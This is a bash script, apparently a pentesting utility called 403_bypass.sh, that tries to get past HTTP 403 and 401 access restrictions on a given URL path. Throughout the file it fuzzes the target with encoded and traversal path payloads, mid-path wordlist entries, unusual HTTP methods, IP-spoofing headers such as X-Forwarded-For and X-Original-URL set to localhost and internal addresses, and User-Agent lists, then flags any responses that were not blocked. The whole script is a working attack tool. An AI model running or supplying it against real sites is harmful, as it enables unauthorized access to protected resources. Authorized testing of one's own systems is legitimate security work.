#!/bin/bash

#colors
cyan='\e[96m'
red='\e[31m'
green='\e[32m'
end='\e[0m'


if [ -z "$1" ] || [ -z "$2" ]; then
	echo "[!] URL or path not defined (./403_bypass.sh http://example.com /path)"
	exit 1
fi

url=$1
path=$2

echo -e "\n>> URL: $url"
echo ">> Path: $path"

echo -e "\n$cyan[!] Checking connection...$end"

read -r http_code size_download <<< $(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" "$url$path")

if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then

	if [ "$http_code" -ne 200 ]; then
		echo -e "$red[!] HTTP code: $http_code"
		echo -e "[!] Error reaching the host$end"
		exit 1
	fi
	
	echo -e "$green[+] HTTP response: $http_code"
	echo -e "[!] Fuzzing not necessary$end"
	exit 0
fi 

echo -e "[+] Connection OK\n"

find=()
total_requests=0


# URL ENCODING BYPASS

echo -e "$cyan[!] URL Encode bypass$end"

fuzz_list=(
	"/?"
	"//"
	"///"
	"/./"
	"?"
	"??"
	"/?/"
	"/??"
	"/??/"
	"/.."
	"/../"
	"/./"
	"/."
	"/.//"
	"/*"
	"//*"
	"/%2f"
	"/%2f/"
	"/%20"
	"/%20/"
	"/%09"
	"/%09/"
	"/%0a"
	"/%0a/"
	"/%0d"
	"/%0d/"
	"/%25"
	"/%25/"
	"/%23"
	"/%23/"
	"/%26"
	"/%3f"
	"/%3f/"
	"/%26/"
	"/#"
	"/#/"
	"/#/./"
	"/./"
	"/..;/"
	".json"
	"/.json"
	"..;/"
	";/"
	"%00"
	".css"
	".html"
	"?id=1"
	"~"
	"/~"
	"/°/"
	"/&"
	"/-"
	"\/\/"
	"/..%3B/"
	"/;%2f..%2f..%2f"
)

for fuzz in ${fuzz_list[@]}; do
		
		read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" "$url$path$fuzz")"
		
		(( total_requests++ ))
		
		if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 404 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
            		echo -e "[+] $url$path$fuzz -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
            		find+=("$http_code -- $size_download -- $url$path$fuzz")
       		else
            		echo -e "[+] $url$path$fuzz -- HTTP code:$red $http_code $end-- Size download: $size_download"
       		fi

done


fuzz_list=()

while IFS= read -r riga; do
    fuzz_list+=("$riga")
done < "midpaths.txt"

for fuzz in ${fuzz_list[@]}; do

		read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" "$url$fuzz$path")"
		
		(( total_requests++ ))
		
		if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 404 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
            		echo -e "[+] $url$fuzz$path -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
            		find+=("$http_code -- $size_download -- $url$fuzz$path")
        	else
            		echo -e "[+] $url$fuzz$path -- HTTP code:$red $http_code $end-- Size download: $size_download"
        	fi

done

read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" "$url/%20$path/%20")"

(( total_requests++ ))

if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 404 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
	echo -e "[+] $url%20$path/%20 -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
	find+=("$http_code -- $size_download -- $url%20$path/%20")
else
	echo -e "[+] $url%20$path/%20 -- HTTP code:$red $http_code $end-- Size download: $size_download"
fi

read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" "$url/%20$path/%20/")"

(( total_requests++ ))

if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 404 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
	echo -e "[+] $url%20$path/%20/ -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
	find+=("$http_code -- $size_download -- $url%20$path/%20/")
else
	echo -e "[+] $url%20$path/%20/ -- HTTP code:$red $http_code $end-- Size download: $size_download"
fi

read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" "$url$path/..\;/")"

(( total_requests++ ))

if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 404 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
	echo -e "[+] $url$path/..\;/ -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
	find+=("$http_code -- $size_download -- $url$path/..\;/")
else
	echo -e "[+] $url$path/..\;/ -- HTTP code:$red $http_code $end-- Size download: $size_download"
fi



# FUZZING HTTP METHODS

echo -e "\n$cyan[!] Fuzzing HTTP Methods $end"

req_methods=(
	ACL
	ARBITRARY
	BASELINE-CONTROL
	CHECKIN
	CHECKOUT
	CONNECT
	COPY
	DELETE
	FOO
	GET
	HACK
	INVENTED
	LABEL
	LOCK
	MERGE
	MKACTIVITY
	MKCOL
	MKWORKSPACE
	MOVE
	OPTIONS
	ORDERPATCH
	PATCH
	POST
	PROPFIND
	PROPPATCH
	PUT
	REPORT
	SEARCH
	TRACE
	UNCHECKOUT
	UNLOCK
	UPDATE
	VERSION-CONTROL
)

for method in ${req_methods[@]}; do
	
		read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" -X $method "$url$path")"
		
		(( total_requests++ ))
		
		if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 400 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
            		echo -e "[+] $method -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
            		find+=("$http_code -- $size_download -- $method")
        	else
            		echo -e "[+] $method -- HTTP code:$red $http_code $end-- Size download: $size_download"
        	fi

done

read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" --head "$url$path")"

(( total_requests++ ))

if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 400 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
	echo -e "[+] HEAD -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
	find+=("$http_code -- $size_download -- HEAD")
else
	echo -e "[+] HEAD -- HTTP code:$red $http_code $end-- Size download: $size_download"
fi


# Fuzzing headers

echo -e "\n${cyan}[?] Do you want to try performing header fuzzing? It could take a while (Y/N): ${end}"
read -r choice

if [ $choice == "Y" -o $choice == "y" ]; then

	echo -e "\n$cyan[!] Fuzzing headers$end"

	headers=(
		"Access-Control-Allow-Origin: "
		"Base-Url: "
		"CF-Connecting-IP: "
		"CF-Connecti2ng_IP: "
		"Client-IP: "
		"Destination: "
		"Forwarded: "
		"Forwarded-For: "
		"Forwarded-For-Ip: "
		"Host: "
		"Http-Url: "
		"Origin: "
		"Profile: "
		"Proxy: "
		"Proxy-Host: "
		"Proxy-Url: "
		"Real-Ip: "
		"Redirect: "
		"Referer: "
		"Referrer: "
		"Request-Uri: "
		"True-Client-IP: "
		"Uri: "
		"Url: "
		"X-Arbitrary: "
		"X-Client-IP: "
		"X-Custom-IP-Authorization: "
		"X-Forward: "
		"X-Forward-For: "
		"X-Forwarded: "
		"X-Forwarded-By: "
		"X-Forwarded-For: "
		"X-Forwarded-For-Original: "
		"X-Forwarded-Host: "
		"X-Forwarded-Proto: "
		"X-Forwarded-Server: "
		"X-Forwarder-For: "
		"X-Host: "
		"X-HTTP-DestinationURL: "
		"X-HTTP-Host-Override: "
		"X-Original-Remote-Addr: "
		"X-Original-URL: "
		"X-Originally-Forwarded-For: "
		"X-Originating-IP: "
		"X-Proxy-Url: "
		"X-ProxyUser-Ip: "
		"X-Real-IP: "
		"X-Referrer: "
		"X-Remote-Addr: "
		"X-Remote-IP: "
		"X-Rewrite-URL: "
		"X-WAP-Profile: "
		"X-Real-Ip: "
		"X-True-IP: "
	)

	ips=(
		"*"
		"0"
		"0.0.0.0"
		"0177.0000.0000.0001"
		"0177.1"
		"0x7F000001"
		"10.0.0.0"
		"10.0.0.1"
		"127.0.0.1"
		"127.0.0.1:443"
		"127.0.0.1:80"
		"127.1"
		"172.16.0.0"
		"172.16.0.1"
		"172.17.0.1"
		"192.168.0.2"
		"192.168.1.0"
		"192.168.1.1"
		"2130706433"
		"8.8.8.8"
		"localhost"
		"localhost:443"
		"localhost:80"
		"norealhost"
		"null"
	)

	for method in "${headers[@]}"; do

			echo -e "\n\t$cyan[+] $method $end"

			for ip in ${ips[@]}; do
			
				read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" -H "$method$ip" "$url$path")"
				
				(( total_requests++ ))
				
				if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 400 ] && [ "$http_code" -ne 401 ] && [ "$http_code" -ne 000 ]; then
			    		echo -e "\t[+] $method$ip -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
			    		find+=("$http_code -- $size_download -- $method$ip")
				else
			    		echo -e "\t[+] $method$ip -- HTTP code:$red $http_code $end-- Size download: $size_download"
				fi
			
			done

	done

fi

# FUZZING USER AGENTS

echo -e "\n$cyan[!] Fuzzing user agents$end"
echo "[+] Collecting from 'UserAgents.fuzz.txt' [https://github.com/danielmiessler/SecLists/tree/master]"

user_agents=()

while IFS= read -r riga; do
    user_agents+=("$riga")
done < "UserAgents.fuzz.txt"

array_length=${#user_agents[@]}

echo "[+] Collected $array_length elements"

echo -e "$cyan[?] Do you want to continue performing $array_length requests? (Y/N): $end"
read -r choice

if [ $choice == "Y" -o $choice == "y" ]; then

	echo -e "$cyan[!] Performing requests...$end"

	for user_agent in "${user_agents[@]}"; do
		
	    	read -r http_code size_download <<< "$(curl -s -o /dev/null -iL -w "%{http_code} %{size_download}" -A "$user_agent" "$url$path")"
	    	
	    	(( total_requests++ ))
	    
			if [ "$http_code" -ne 403 ] && [ "$http_code" -ne 401 ]; then
				echo -e "[+] User Agent: $user_agent -- HTTP code:$green $http_code $end-- Size download: $size_download <== [!] CHECK"
				find+=("$http_code -- $size_download -- $user_agent")
			else
				echo -e "[+] User Agent: $user_agent -- HTTP code:$red $http_code $end-- Size download: $size_download"
			fi
    
	done
fi


## END SCRIPT

echo -e "\n\n$cyan[!] Relevant results$end"

num_finds=${#find[@]}

if [ "$num_finds" -eq "0" ]; then

	echo -e "$red[X] No relevant results.$end"
	echo -e "\n$cyan[!] Total requests: $total_requests $end"
	exit 0
	
fi

for element in "${find[@]}"; do

	echo -e "$green[*]$end $element"

done

echo -e "\n$cyan[!] Total requests: $total_requests $end"
